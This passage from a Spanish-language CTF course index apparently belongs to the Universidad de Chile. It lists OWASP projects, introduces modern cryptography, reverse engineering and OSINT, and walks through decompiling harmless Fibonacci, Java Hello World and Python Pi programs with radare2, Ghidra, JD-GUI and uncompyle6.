compara con repositorios de software con vulnerabilidades conocidas,\navisando si se utiliza alguno de estos.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/www-project-juice-shop/\"\u003eJuice Shop\u003c/a\u003e: Es un sitio web especialmente diseñado para ser vulnerable\na cada uno de los elementos en el OWASP Top 10. Es muy útil para practicar el pentesting.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/www-project-mobile-security-testing-guide/\"\u003eMobile Security Testing Guide\u003c/a\u003e: Similar a la\nWeb Security Testing Guide, pero para aplicaciones móviles.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/www-project-modsecurity-core-rule-set/\"\u003eModSecurity Core Rule Set\u003c/a\u003e: Es un set de reglas\ngenéricas de detección de ataques, compatibles con firewalls, Web Application Firewalls (WAFs) y otros filtros.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/www-project-samm/\"\u003eSoftware Assurance Maturity Model (SAMM)\u003c/a\u003e: Es un modelo de desarrollo\nque ayuda a analizar y mejorar los ciclos de desarrollo seguro del software.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/www-project-security-knowledge-framework/\"\u003eSecurity Knowledge Framework\u003c/a\u003e: Base de datos de\nchecklists y buenas prácticas para proyectos para múltiples lenguajes de programación, que muestran cómo prevenir\nel acceso de hackers al sistema.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/www-project-zap/\"\u003eZed Attack Proxy (ZAP)\u003c/a\u003e: Herramienta automatizada de análisis web dinámico.\nRealiza una serie estandarizada de pruebas a aplicaciones web para encontrar vulnerabilidades comunes.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:2,href:"/docs/cripto-moderna/intro/",title:"Intro a Criptografía Moderna",description:null,content:"\u003ch2 id=\"motivación\"\u003eMotivación\u003c/h2\u003e\n\u003cp\u003eDebido tanto al \u003cem\u003etecnooptimismo\u003c/em\u003e de sus creadores como a las limitaciones tecnológicas de la época, la Internet se pensó inicialmente como una red pública, en la que potencialmente cualquier par de computadores pudiese comunicarse de forma fácil y directa, sin importar en qué lugar geográfico se encontrasen o si compartían proveedor de Internet. Eran tiempos más simples, en los que la información que fluía por ahí no era necesariamente muy importante, o al menos la gente que podía ser capaz de interceptarla y leerla era muy poca.\u003c/p\u003e\n\u003cp\u003eSin embargo, a medida ha aumentado la cantidad de usuarios de la Internet y la cantidad de cosas que se puede hacer en ella, y a medida cada vez más gobiernos, delincuentes informáticos y grandes empresas quieren saber qué estas haciendo en cada momento, se ha vuelto indispensable contar con la capacidad de poder decidir quién puede y quién no puede acceder a ciertas comunicaciones que ocurren en estos espacios. Por ejemplo, hoy resultaría completamente inaceptable pensar que los números de la tarjeta de crédito que usas para pagar Netflix pudiesen ser vistos por cualquier persona o máquina que resulte estar por ahí cuando envías tu formulario.\u003c/p\u003e\n\u003cp\u003ePara lograr el objetivo anterior contamos con una herramienta matemática muy útil: la criptografía. El principio es sencillo. La información se \u003cem\u003ecifra\u003c/em\u003e antes de enviar por el canal público, de modo que el receptor pueda \u003cem\u003edescifrarla\u003c/em\u003e usando información privada y que es de común acuerdo con el emisor del mensaje.\u003c/p\u003e\n\u003cp\u003eSi bien los avances criptográficos de los últimos años entregan un nivel alto de protección \u003cem\u003een teoría\u003c/em\u003e, \u003cem\u003een la práctica\u003c/em\u003e suelen haber errores de implementación graves que podrían permitir exfiltrar la información sensible. De estos errores se aprovechan entidades que desean descifrar mensajes sin autorización, obteniendo así la información sensible que buscan, y muchas veces sin que las partes que se comunicaban por el canal se enteren de esta intrusión.\u003c/p\u003e\n\u003cp\u003eEn el contexto de los \u003cstrong\u003eCTFs\u003c/strong\u003e, la resolución de problemas de criptografía moderna suele requerir conocer las primitivas criptográficas utilizadas y algunos conceptos matemáticos que las sustentan. Si bien en general esto le entrega una dificultad particular a esta categoría de problemas al no existir herramientas que automaticen su resolución, también los vuelve más interesantes y suelen contar con un mayor puntaje en comparación a otros problemas.\u003c/p\u003e\n\u003cp\u003eEn la unidad anterior hablamos un poco de la \u0026ldquo;criptografía clásica\u0026rdquo;, la cual suele trabajar con mensajes alfabéticos simples y suele ser muy fácil de romper con ayuda de un computador y algunos algoritmos bastante simples de implementar. La criptografía moderna limita los ataques vistos en el caso de la criptografía clásica, aprovechándose la existencia de problemas matemáticos muy difíciles de resolver \u003cem\u003ea la mala\u003c/em\u003e, en algunos casos incluso con una gran capacidad de cómputo.\u003c/p\u003e\n\u003cp\u003eComo este curso no intenta ser extensivo ni formal en lo que a criptografía se refiere, nos enfocaremos en tres puntos principales: Criptografía simétrica, criptografía asimétrica y \u003cem\u003ehashing\u003c/em\u003e. En el caso de las dos primeras áreas, veremos tanto algoritmos para mantener su confidencialidad y demostrar su autenticidad, mientras que en la tercera área nos enfocaremos en los algoritmos utilizados para la validación de contraseñas en sistemas informáticos.\u003c/p\u003e\n\u003ch2 id=\"bibliografía-útil\"\u003eBibliografía útil\u003c/h2\u003e\n\u003cp\u003eGran parte de las explicaciones teóricas de esta unidad se basan en las del libro \u003cstrong\u003eSerious Cryptography\u003c/strong\u003e de Jean-Phillipe Aumasson. Por lo que si necesitan más información, pueden revisarlo.\u003c/p\u003e\n\u003cp\u003eTambién pueden utilizar el libro \u003cstrong\u003ePractical Cryptography in Python\u003c/strong\u003e como apoyo para la parte de programacion.\u003c/p\u003e\n"},{id:3,href:"/docs/reversa/intro/",title:"Intro a la Ingeniería Reversa",description:null,content:"\u003ch2 id=\"motivación\"\u003eMotivación\u003c/h2\u003e\n\u003cp\u003eEn computación, la ingeniería reversa (reverse engineering o \u003cem\u003ereversing\u003c/em\u003e) se refiere al proceso de analizar\nun ejecutable, código binario o bytecode, para entender su comportamiento interno.\nPara hacer esto, se suele convertir el código de bajo nivel de entrada en algo de nivel un poco más alto,\ncomo Assembler o C. De esta forma, se vuelve mucho más fácil de entender, aunque aún puede requerir un\ntrabajo mental considerable hacerlo.\u003c/p\u003e\n\u003cp\u003eLos challenges de reversing suelen tener uno de estos dos objetivos (o a veces ambos):\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eIdentificar los pasos de algún proceso que puede ser vulnerado, como la interacción con una API o el uso\nde ciertos módulos o librerías.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eEncontrar un secreto escondido dentro del ejecutable, como una contraseña que puede estar obfuscada o\nencriptada.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eLas aplicaciones de esto son bastante directas: poder revisar y entender programas y ejecutables sin tener\nacceso al código fuente. Esto es bastante común, particularmente si se dedican a analizar aplicaciones móviles.\u003c/p\u003e\n\u003cp\u003eLos desarrolladores suelen asumir que, una vez compilado y empaquetado, el código se vuelve totalmente\nilegible e imposible de entender. Este puede ser un error crítico, pues el código de las aplicaciones es\ntotalmente público al cliente, y \u003cstrong\u003etodo programa puede ser reversado\u003c/strong\u003e.\u003c/p\u003e\n\u003ch2 id=\"assembler\"\u003eAssembler\u003c/h2\u003e\n\u003cp\u003ePara poder realizar algunos de los ejercicios de este capítulo es necesario entender algo del lenguaje Assembler.\nEsta es una manera de codificar instrucciones y datos a un muy bajo nivel (muy cercano al lenguaje de máquina).\nEl formato exacto del lenguaje varía dependiendo de la arquitectura de la CPU, las más típicas siendo \u003ccode\u003ex86\u003c/code\u003e y\n\u003ccode\u003eARM\u003c/code\u003e, pero tienen varios elementos en común.\u003c/p\u003e\n\u003cp\u003eCada instrucción se compone de una operación básica (operaciones aritméticas, leer o escribir registros,\ninsertar o quitar elementos de la pila, etc) y 0 o más argumentos, los cuales pueden ser un valor fijo (número,\nstring, etc), un registro de la CPU, una dirección de memoria, entre otros. A continuación tenemos un ejemplo\nde \u003cem\u003eHello World\u003c/em\u003e en Assembler \u003ccode\u003ex86\u003c/code\u003e.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e;Copyright (c) 1999 Konstantin Boldyshev \u0026lt;konst@linuxassembly.org\u0026gt;\n;\n;\u0026quot;hello, world\u0026quot; in assembly language for Linux\n;\n;to build an executable:\n;       nasm -f elf hello.asm\n;       ld -s -o hello hello.o\n\nsection .text\n; Export the entry point to the ELF linker or loader.  The conventional\n; entry point is \u0026quot;_start\u0026quot;. Use \u0026quot;ld -e foo\u0026quot; to override the default.\n    global _start\n\nsection .data\nmsg db  'Hello, world!',0xa ;our dear string\nlen equ $ - msg         ;length of our dear string\n\nsection .text\n\n; linker puts the entry point here:\n_start:\n\n; Write the string to stdout:\n\n    mov edx,len ;message length\n    mov ecx,msg ;message to write\n    mov ebx,1   ;file descriptor (stdout)\n    mov eax,4   ;system call number (sys_write)\n    int 0x80    ;call kernel\n\n; Exit via the kernel:\n\n    mov ebx,0   ;process' exit code\n    mov eax,1   ;system call number (sys_exit)\n    int 0x80    ;call kernel - this interrupt won't return\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003ePueden encontrar documentación y un tutorial sobre Assembler\n\u003ca href=\"https://www.tutorialspoint.com/assembly_programming/index.htm\"\u003eaquí\u003c/a\u003e.\u003c/p\u003e\n"},{id:4,href:"/docs/osint/intro/",title:"Intro a OSINT",description:null,content:"\u003cp\u003e\u003cem\u003eOpen Source Intelligence\u003c/em\u003e (OSINT) es una metodología para recolectar y analizar información mediante fuentes\nde tipo \u003cem\u003eopen source\u003c/em\u003e. Es decir, cualquier información que esté disponible públicamente.\nEsto se puede hacer de manera manual, pero, dependiendo del ámbito de la búsqueda, existen herramientas\npara automatizar el proceso de cierta forma. Este tema rara vez aparece en competencias de CTF, pero de todas\nformas se pueden encontrar con challenges de este tipo.\u003c/p\u003e\n\u003cp\u003eLa información obtenida mediante este método incluye:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eDatos personales (nombre, rut, email, dirección, etc)\u003c/li\u003e\n\u003cli\u003ePersonas, empresas o entidades relacionadas\u003c/li\u003e\n\u003cli\u003eDominios, subdominios, IPs\u003c/li\u003e\n\u003cli\u003eNombres de usuario\u003c/li\u003e\n\u003cli\u003eDispositivos\u003c/li\u003e\n\u003cli\u003eY muchas otras cosas\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003ePara poder realizar el proceso de OSINT de manera efectiva, primero se necesita un punto de partida:\nalgún tipo de información que nos indique el contexto de la búsqueda, y por donde es posible comenzar\na buscar. Por ejemplo, el challenge puede contener simplemente el nombre de una persona, y para resolverlo\ndeberán utilizar todas las herramientas disponibles hasta encontrar la flag. Otras veces también se explicita\nel dato que deben encontrar, como la ubicación de esta persona en una hora específica,\ncon lo cual disminuye el rango de opciones.\u003c/p\u003e\n\u003cp\u003eEn algunos casos puede ser necesario realizar búsquedas en redes sociales, ya sea las clásicas (Facebook,\nTwitter, Instagram, Linkedin, etc) o en otras más rebuscadas y poco conocidas.\nLa forma de buscar dependerá fuertemente de la red social en específico que están viendo, y usualmente\nel proceso tendrá que ser hecho de manera manual.\u003c/p\u003e\n"},{id:5,href:"/docs/forense/intro/",title:"Intro al Análisis Forense",description:null,content:""},{id:6,href:"/docs/pwning/intro/",title:"Intro al Pwning",description:null,content:""},{id:7,href:"/docs/prologo/intro/",title:"Prólogo",description:null,content:"\u003cp\u003eEste apunte recoge los contenidos usualmente vistos los cursos de \u003cstrong\u003eTaller de Programación Competitiva\u003c/strong\u003e del \u003ca href=\"https://dcc.uchile.cl\"\u003eDepartamento de Ciencias de la Computación\u003c/a\u003e de la \u003ca href=\"https://ingenieria.uchile.cl\"\u003eFacultad de Ciencias Físicas y Matemáticas\u003c/a\u003e de la \u003ca href=\"https://uchile.cl\"\u003eUniversidad de Chile\u003c/a\u003e. El objetivo de estos cursos es acercar al estudiante al área de la programación competitiva, aplicando eficazmente estructuras de datos y algoritmos para resolver en corto tiempo problemas de programación complejos, limitados en tiempo y memoria computacional.\u003c/p\u003e\n\u003cp\u003eEste apunte también funciona como un documento vivo, en el que se le invita a quienes lo leen a modificarlo, copiarlo y/o a aportar con pull requests nuevas secciones, ejemplos y ejercicios.\u003c/p\u003e\n\u003ch2 id=\"por-donde-partir\"\u003e¿Por donde partir?\u003c/h2\u003e\n\u003ch3 id=\"contenido-del-curso\"\u003eContenido del curso\u003c/h3\u003e\n\u003cp\u003eLos capítulos de la barra lateral se muestran un orden de complejidad ascendiente. Por lo tanto, es recomendable seguirlos en ese mismo orden, no obstante, siéntete libre de omitir secciones en las que te manejes.\u003c/p\u003e\n\u003ch3 id=\"preparación-del-entorno-de-programación\"\u003ePreparación del entorno de programación\u003c/h3\u003e\n\u003cp\u003ePara manejar las herramientas mínimas requeridas para programar, revisa el anexo sobre \u0026ldquo;IDEs y Compilación\u0026rdquo;.\u003c/p\u003e\n"},{id:8,href:"/docs/reversa/decompiling/",title:"Decompilación",description:null,content:"\u003cp\u003eCon decompilación nos referiremos a la acción de tomar un programa compilado, ya sea a código binario o\nbytecode, y devolverlo a una forma legible para humanos. Esto puede ser código Assembler, o algo un poco\nmás sofisticado, como C, Java, Python, .Net, PHP, entre otros. Hacer esto de manera manual se puede volver prohibitivamente costoso\ny difícil, pero afortunadamente existen algunas herramientas que ayudan en el proceso, y muchas veces logran\nobtener un código casi idéntico al original. Esto claramente irá variando caso a caso, pero de todas formas\nanalizar un código en C poco legible, o incluso en Assembler, es mucho más fácil que hacerlo para\ncódigo binario.\u003c/p\u003e\n\u003ch2 id=\"decompilación-de-binarios\"\u003eDecompilación de Binarios\u003c/h2\u003e\n\u003cp\u003eLa decompilación de binarios puede tomar 2 formas:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eDecompilación Estática\u003c/strong\u003e: Toma como entrada el código binario y retorna uno o más archivos con código\ndecompilado. Esto sirve para analizar el código de manera estática, como también para realizar cambios al\ncódigo y ver cómo se comporta.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eDecompilación en Tiempo de Ejecución\u003c/strong\u003e: Se ejecuta el código de una forma especial, que permite ver las\ninstrucciones y datos utilizados durante la ejecución en formato Assembler. Funciona de manera similar a un\ndebugger, teniendo la capacidad de iterar por las instrucciones una a una y definir \u003cem\u003ebreak points\u003c/em\u003e.\nAdicionalmente, permite leer y modificar directamente los registros de la CPU y la memoria del proceso.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eLas herramientas más utilizadas son \u003ca href=\"https://ghidra-sre.org/\"\u003eGhidra\u003c/a\u003e para la decompilación estática, y\n\u003ca href=\"https://rada.re/n/radare2.html\"\u003eradare2\u003c/a\u003e para la decompilación en tiempo real.\u003c/p\u003e\n\u003cp\u003eA modo de ejemplo ocuparemos una implementación de Fibonacci en C, la cual la decompilaremos luego usando\nGhidra y radare2.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e#include \u0026lt;stdio.h\u0026gt;\n#include \u0026lt;stdlib.h\u0026gt;\n\nint fibonacci(int n) {\n        if (n == 1 || n == 2) {\n                return 1;\n        }\n        return fibonacci(n - 1) + fibonacci(n - 2);\n}\n\nvoid main(int argc, char *argv[]) {\n        int n = atoi(argv[1]);\n        int f = fibonacci(n);\n        printf(\u0026quot;%d\\n\u0026quot;, f);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eLa compilamos:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003egcc -o fibonacci fibonacci.c\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eY vemos que funciona como esperamos:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../c-exec.png\" alt=\"C Exec\"\u003e\u003c/p\u003e\n\u003ch3 id=\"radare2\"\u003eRadare2\u003c/h3\u003e\n\u003cp\u003eRadare2 nos permite ejecutar el código, y al mismo tiempo decompilarlo a Assembler. Este tiene muchas opciones\ny funcionalidades, y se puede volver bastante complejo de usar, por lo que es recomendable revisar la\n\u003ca href=\"https://book.rada.re/index.html\"\u003edocumentación\u003c/a\u003e y tutoriales como\n\u003ca href=\"https://www.megabeets.net/a-journey-into-radare-2-part-1/\"\u003eeste\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eEmpezaremos por lanzar radare2 en modo debug para analizar el ejecutable. Notar que es necesario entregarle\nun argumento a fibonacci, sino fallará. Una vez dentro de radare2, realizamos un análisis básico del binario.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../radare2-launch.png\" alt=\"Radare2 Launch\"\u003e\u003c/p\u003e\n\u003cp\u003eLuego, listamos las funciones definidas para entender mejor la estructura interna. Vemos 2 que nos podrían\ninteresar: \u003cem\u003emain\u003c/em\u003e y \u003cem\u003esym.fibonacci\u003c/em\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../radare2-functions.png\" alt=\"Radare2 Functions\"\u003e\u003c/p\u003e\n\u003cp\u003eDefinimos un \u003cem\u003ebreak point\u003c/em\u003e en la función \u003cem\u003emain\u003c/em\u003e y dejamos correr el proceso. Para ver el código decompilado\n(o desensamblado), ejecutamos \u003ccode\u003epdf\u003c/code\u003e (por Print Disassembled Function). Esto nos muestra 3 columnas:\nla dirección de memoria de la instrucción, la instrucción en hexadecimal, y la instrucción desensamblada\nen formato Assembler.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../radare2-main.png\" alt=\"Radare2 Main\"\u003e\u003c/p\u003e\n\u003cp\u003eObservamos que aparecen algunas cosas interesantes, como las llamadas a funciones y el string utilizado\npara formatear e imprimir el resultado. Ahora definimos un \u003cem\u003ebreak point\u003c/em\u003e en la dirección de memoria en donde\nse llama a la función \u003cem\u003esym.fibonacci\u003c/em\u003e, y continuamos con la ejecución.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../radare2-break.png\" alt=\"Radare2 Break\"\u003e\u003c/p\u003e\n\u003cp\u003ePara entrar a la función, ejecutamos solo una instrucción (la llamada a la función) usando el comando \u003ccode\u003eds\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../radare2-fibonacci.png\" alt=\"Radare2 Fibonacci\"\u003e\u003c/p\u003e\n\u003cp\u003eFinalmente, pueden ver un diagrama de flujos usando el comando \u003ccode\u003eVV\u003c/code\u003e. Esto les puede ayudar a entender\nlos distintos caminos de ejecución que puede tomar el proceso y qué sucede en cada uno.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../radare2-diagram.png\" alt=\"Radare2 Diagram\"\u003e\u003c/p\u003e\n\u003ch3 id=\"ghidra\"\u003eGhidra\u003c/h3\u003e\n\u003cp\u003ePara decompilar el ejecutable, primero abrimos Ghidra y creamos un proyecto cualquiera.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../ghidra-project.png\" alt=\"Ghidra Project\"\u003e\u003c/p\u003e\n\u003cp\u003eLuego hacemos click en la herramienta \u003cem\u003eCodeBrowser\u003c/em\u003e (En \u003cem\u003eTool Chest\u003c/em\u003e es el dragón verde) e importamos el archivo.\nDebería aparecer un popup preguntando si desean analizarlo, y dicen que sí. Aparecerá mucha información, más\nde la que se espera para un código tan simple. Esta corresponde a las librerías utilizadas (\u003cem\u003estdio\u003c/em\u003e y \u003cem\u003estdlib\u003c/em\u003e),\nal igual que algunas otras definiciones.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../ghidra-ui.png\" alt=\"Ghidra UI\"\u003e\u003c/p\u003e\n\u003cp\u003eA la izquierda está en panel de \u003cem\u003eSymbol Tree\u003c/em\u003e, con un dropdown llamado \u003cem\u003eFunctions\u003c/em\u003e. Si seleccionan la función\nfibonacci podrán ver el código decompilado de la función que definimos. Es bastante parecido al código\noriginal, pero se ven claras diferencias y es menos legible.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../ghidra-decompiled.png\" alt=\"Ghidra Decompiled\"\u003e\u003c/p\u003e\n\u003ch2 id=\"decompilación-de-bytecode\"\u003eDecompilación de Bytecode\u003c/h2\u003e\n\u003cp\u003eEl bytecode es una especie de código compilado, pero no a lenguaje de máquina, sino que a un lenguaje intermedio\npensado para ser ejecutado en un ambiente virtualizado. Luego, el bytecode es análogo a un lenguaje\nAssembler para la máquina virtual que lo corre.\nSe utiliza mucho para transformar lenguajes interpretados en algo un poco más eficiente de ejecutar,\npero sin tener que implementar un compilador completo.\nEste bytecode usualmente no difiere mucho del código original, y puede ser decompilado directamente,\ncasi sin alteraciones. Esto suele ser mucho más fácil de analizar que los binarios decompilados, ya que se\nobtiene inmediatamente código en un lenguaje de alto nivel.\u003c/p\u003e\n\u003ch3 id=\"java\"\u003eJava\u003c/h3\u003e\n\u003cp\u003eEn el caso de Java, el código se compila para ser ejecutado en la Java Virtual Machine (JVM).\nEl bytecode se encuentra en los archivos \u003ccode\u003e.class\u003c/code\u003e generados al hacer la compilación, los cuales también\npueden ser obtenidos desde un archivo empaquetado \u003ccode\u003e.jar\u003c/code\u003e. Estos pueden ser decompilados directamente\ncon \u003ca href=\"https://java-decompiler.github.io/\"\u003eJD-GUI\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eComo ejemplo crearemos un ejecutable \u003ccode\u003e.jar\u003c/code\u003e y realizaremos el proceso para decompilarlo. El código será un\nsimple Hello World en el archivo \u003ccode\u003eHelloWorld.java\u003c/code\u003e.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003epublic class HelloWorld {\n\tpublic static void main(String[] args) {\n\t\tSystem.out.println(\u0026quot;Hello World!\u0026quot;);\n\t}\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eNecesitaremos un manifesto para crear el \u003ccode\u003e.jar\u003c/code\u003e correctamente. Para eso debemos tener el archivo\n\u003ccode\u003eMANIFEST.MF\u003c/code\u003e con el contenido:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eMain-Class: HelloWorld\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eLuego compilamos y empaquetamos el código:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../java-compiling.png\" alt=\"Java Compiling\"\u003e\u003c/p\u003e\n\u003cp\u003eAl ejecutar el archivo \u003ccode\u003eHelloWorld.jar\u003c/code\u003e verificamos que efectivamente hace lo que queremos:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../java-exec.png\" alt=\"Java Exec\"\u003e\u003c/p\u003e\n\u003cp\u003ePara decompilar el código simplemente abrimos el archivo \u003ccode\u003eHelloWorld.jar\u003c/code\u003e con el decompilador JD-GUI, lo que\nnos muestra un código Java casi idéntico al original.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../java-decompiled.png\" alt=\"Java Decompiled\"\u003e\u003c/p\u003e\n\u003ch3 id=\"python\"\u003ePython\u003c/h3\u003e\n\u003cp\u003eSi bien Python es un lenguaje interpretado, también tiene una forma compilada. Estos son los archivos \u003ccode\u003e.pyc\u003c/code\u003e\no \u003ccode\u003e.pyo\u003c/code\u003e que aparecen a veces dentro de \u003ccode\u003e__pycache__\u003c/code\u003e.\nPara decompilar el bytecode de Python, se puede utilizar librerías de Python:\n\u003ca href=\"https://github.com/rocky/python-decompile3\"\u003edecompyle3\u003c/a\u003e para Python3.7 en adelante\n(aún no hay soporte para Python3.9), y \u003ca href=\"https://pypi.org/project/uncompyle6/\"\u003euncompyle6\u003c/a\u003e\npara versiones anteriores. Se usan en la terminal de manera muy simple:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003edecompyle3 \u0026lt;archivo pyc o pyo\u0026gt;\nuncompyle6 \u0026lt;archivo pyc o pyo\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eComo ejemplo ocuparemos un script para calcular PI usando la fórmula de Leibniz y Python2.7.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003esys\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eLeibniz\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mf\"\u003e0.0\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ek\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mf\"\u003e1.0\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"nb\"\u003erange\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"n\"\u003ek\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e-=\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"n\"\u003ek\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ek\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esys\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n\u003cspan class=\"n\"\u003epi\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eLeibniz\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"k\"\u003eprint\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;PI = \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003epi\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eAl ejecutarlo vemos que nos retorna una aproximación de PI que depende del número de iteraciones que definamos.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../python-exec.png\" alt=\"Python Aprox\"\u003e\u003c/p\u003e\n\u003cp\u003eCompilamos el código a bytecode, el cual aparecerá en un nuevo archivo \u003ccode\u003epi.pyc\u003c/code\u003e.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003epython -m compileall pi.py\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eFinalmente decompilamos el archivo usando uncompyle6 y obtenemos un código casi exactamente igual al original:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../python-uncompiled.png\" alt=\"Python Uncompiled\"\u003e\u003c/p\u003e\n"},{id:9,href:"/docs/osint/google/",title:"Google Hacking",description:null,content:"\u003cp\u003eTodos sabemos cómo hacer búsquedas en Google (o cualquier otro motor de búsqueda similar):\nsimplemente ingresamos las palabras relevantes en el campo de búsqueda y dejamos que el algoritmo haga su\ntrabajo. Sin embargo internet es muy (MUY) grande, y muchas veces obtenemos resultados que coinciden con\nnuestra búsqueda, pero no nos son útiles. Esto hace que el proceso de investigación sea más lento y menos\neficiente.\u003c/p\u003e\n\u003cp\u003eAfortunadamente la gran mayoría de los motores de búsqueda implementan algún tipo de búsqueda avanzada, que nos\npermite filtrar muchos de los falsos positivos que encontramos normalmente. Aquí estudiaremos la implementación\nde Google, ya que suele ser la más efectiva, pero también existen sistemas parecidos de búsqueda para\nDuckDuckGo, Bing y otros.\u003c/p\u003e\n\u003ch2 id=\"google-dorks\"\u003eGoogle Dorks\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Google_hacking\"\u003eGoogle Hacking\u003c/a\u003e, o también llamado \u003cem\u003eGoogle 